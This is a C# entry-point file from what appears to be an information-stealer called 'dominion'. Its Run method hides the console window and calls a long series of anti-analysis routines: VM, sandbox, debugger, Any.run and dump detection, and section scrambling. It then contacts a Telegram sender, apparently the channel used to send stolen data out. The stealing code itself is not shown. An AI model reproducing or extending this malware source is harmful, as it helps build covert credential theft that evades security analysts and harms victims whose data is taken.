using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using dominion.src.dominion.Stealer.General;
using dominion.src.dominion.configuration;
using dominion.src.dominion.Security;

namespace dominion.src
{
    internal class Entry
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void Run()
        {
            if (!configuration.DebugMode)
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }

            if (configuration.EnableSecurityChecks)
            {
                RunSecurityChecks();
            }

            LogSucess("Successfully initialized src's Entry.cs");

            try
            {
                SendMessage().Wait();
            }
            catch (Exception ex)
            {
                Console.Beep();
                LogError("Initializing telegram had an issue: " + ex.Message);
                Console.WriteLine(ex);
            }

            Console.ReadLine();
        }

        private static void RunSecurityChecks()
        {
            AntiVm.Execute();
            DetectDebugger.Run();
            AntiInjectionCheck.RunChecks();
            BehavioralAnomalyCheck.RunChecks();
            DetectAnalysisTools.Run();
            DetectAnyrunMac.Run();
            DetectEnvironmentVariables.Run();
            DetectHarmonyPatch.Run();
            DetectILDasm.Run();
            DetectInlineHook.Run();
            DetectMemoryPatching.Run();
            DetectRemoteDebugger.Run();
            DetectSandbox.Run();
            DetectTimingAnalysis.Run();
            PreventDump.Run();
            ProcessNameCheck.RunChecks();
            AntiDumpSectionScramble.Run();
        }

        private static async Task SendMessage()
        {
            using (var sender = new Sender())
            {
                await sender.SendHelloMessage();
            }
        }

        public static void Log(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
        }

        public static void LogError(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [X] {message}");
        }

        public static void LogWarning(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [!] {message}");
        }

        public static void LogSucess(string message)
        {
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [*] {message}");
        }
    }
}